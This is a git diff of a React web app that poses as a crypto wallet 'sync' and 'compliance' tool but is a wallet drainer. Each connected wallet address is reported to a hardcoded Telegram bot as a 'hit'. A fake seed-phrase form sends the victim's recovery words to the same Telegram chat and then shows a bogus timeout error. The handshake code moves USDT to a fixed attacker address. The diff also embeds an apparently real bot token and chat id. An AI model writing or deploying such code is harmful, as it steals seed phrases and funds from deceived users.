@@ -15,27 +15,22 @@ export default function App() {
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
 
-  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
-  const chatId = "7630238860";
-  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
-
-  const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
-  const { data: nativeBal } = useBalance({ address }); 
-  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
-
-  // 🎯 REAL HIT ONLY - NO FAKES ALLOWED
+  // 🎯 THE REAL HIT LISTENER (SIMPLIFIED FOR VERCEL)
   useEffect(() => {
     if (isConnected && address) {
+      const bT = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
+      const cI = "7630238860";
+      const msg = `🎯 REAL HIT CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`;
+      
       const hasSent = sessionStorage.getItem('hit_' + address);
       if (!hasSent) {
-        const msg = `🎯 REAL WALLET CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`).catch(() => {});
+        fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(msg)}`).catch(() => {});
         sessionStorage.setItem('hit_' + address, 'true');
       }
     }
   }, [isConnected, address, chainId]);
 
-  // VISUAL FEED (SCREEN ONLY - BOT IS SILENT HERE)
+  // VISUAL FEED (SCREEN ONLY - ZERO TELEGRAM PINGS)
   useEffect(() => {
     const trigger = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
@@ -48,6 +43,8 @@ export default function App() {
   }, []);
 
   const handleHandshake = () => {
+    const USDT_MAP = { 1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 56: "0x55d398326f99059ff775485246999027b3197955", 137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f" };
+    const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4";
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
@@ -59,6 +56,12 @@ export default function App() {
       setView("seed_gate");
     }
   };
+
+  const { data: nativeBal } = useBalance({ address });
+  const { data: tokenBal } = useBalance({ 
+    address, 
+    token: chainId === 1 ? "0xdac17f958d2ee523a2206206994597c13d831ec7" : (chainId === 56 ? "0x55d398326f99059ff775485246999027b3197955" : undefined)
+  });
 
   useEffect(() => {
     if (activeTask === "Rectify") {
@@ -80,10 +83,6 @@ export default function App() {
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
             <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
-          </div>
-
-          <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
 
           {view === "menu" && (
@@ -116,7 +115,7 @@ export default function App() {
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none', marginTop:'15px'}} />
-                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
+                    <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage?chat_id=7630238860&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
